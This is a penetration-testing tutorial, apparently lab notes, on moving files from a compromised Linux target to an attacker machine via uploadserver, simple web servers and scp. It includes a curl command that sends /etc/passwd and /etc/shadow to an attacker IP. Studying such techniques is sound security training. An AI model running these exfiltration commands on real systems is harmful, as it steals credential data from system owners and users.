During a penetration test, there are situations such as **binary exploitation**, **log collection**, or **packet capture analysis** where files must be uploaded from the compromised target machine to the attacker host.

Most download techniques can be reversed and used for uploads. Below are several common and practical upload methods.

---

## Web Upload

A simple and effective way to upload files is by using an HTTP server that supports file uploads. The `uploadserver` Python module extends the default HTTP server and provides an upload endpoint.

To improve security, HTTPS can be used to encrypt the file transfer.


### Attacker Machine 

**Install uploadserver:**

```bash
sudo python3 -m pip install --user uploadserver
```


### Create a Self-Signed Certificate

A self-signed certificate is used to enable HTTPS communication.

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```


### Start HTTPS Upload Server

It is recommended to host the server files in a separate directory.

```bash
mkdir https && cd https
```

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

The upload endpoint will be available at `/upload`.


### Linux Target

**Upload Files Using cURL:**

```bash
curl -X POST https://192.168.49.128/upload \
-F 'files=@/etc/passwd' \
-F 'files=@/etc/shadow' \
--insecure
```

The `--insecure` option is required when using a self-signed certificate.

---

## Alternative Web File Transfer Method

In many cases, the compromised Linux system already has **Python**, **PHP**, or other scripting languages installed. These can be used to quickly start a web server and expose files for download.

This approach is useful when direct upload mechanisms are unavailable.

### Linux Target

**Create a Web Server with Python 3:**

```bash
python3 -m http.server
```

**Create a Web Server with Python 2.7:**

```bash
python2.7 -m SimpleHTTPServer
```


**Create a Web Server with PHP:**

```bash
php -S 0.0.0.0:8000
```


**Create a Web Server with Ruby:**

```bash
ruby -run -ehttpd . -p8000
```

Each command starts a simple HTTP server that serves files from the current directory.


### Attacker Machine 

**Download the File from the Target:**

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

This method technically downloads the file from the target, even though it achieves the same goal as an upload.

> Note: Inbound connections to the target may be blocked. This method relies on outbound access from the attacker to the target’s web server.

---

## SCP Upload

If outbound SSH connections (TCP/22) are allowed, files can be uploaded securely using the `scp` utility.

SCP uses the SSH protocol and provides encrypted file transfer.

### File Upload Using SCP

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

You will be prompted for the user’s password on the target system.

> Note: `scp` syntax is very similar to `cp`, but requires specifying a remote user and host.
